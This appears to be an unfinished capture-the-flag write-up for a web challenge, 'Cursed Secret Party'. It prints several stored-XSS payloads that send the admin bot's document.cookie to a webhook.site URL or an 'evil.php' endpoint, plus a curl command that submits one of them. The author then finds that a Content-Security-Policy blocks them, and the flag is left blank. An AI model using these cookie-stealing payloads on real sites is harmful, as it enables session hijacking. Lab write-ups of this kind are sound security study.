# Cursed Secret Party

## The Problem

Points: 

Rating:

Author:

Flavor Text:
```

You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?


```

Attachments : [web_cursed_party.zip](web_cursed_party.zip)



## Solution


looks like a signup form system with an admin backend. 

the api takes in the input and the bot.js simulates the admin user accessing the site. 

ill inject an attack to pull their session cookie and use it to access the site. 



test <script>image = new image(); image.src=\"https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c=\"+document.cookie;</script>

<script>image = new Image(); image.src=\\\"https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c=\\\"+document.cookie;</script>


curl 'http://161.35.172.25:31135/api/submit' -H 'Content-Type: application/json' --data-raw "{"halloween_name":"test","email":"test@me.com","costume_type":"<script>image = new Image(); image.src="https://webhook.site/d8370670-7370-451e-ac01-9557328f9228?c="+document.cookie;</script>","trick_or_treat":"tricks"}"


<SCRIPT type=”text/javascript”>
Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);
</SCRIPT>


\"<script src='https://webhook.site/" + webhook.Uuid + "'></script>\"

several variations on payloads and formatting have had no effect. I tryed two different webhook sites and got nowhere. 


it turned out that there is an additional security feature included in index.js

```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});

```

the entire website includes:
![](Content-Security-Policy.png)

## Flag
```

```

## Final Notes
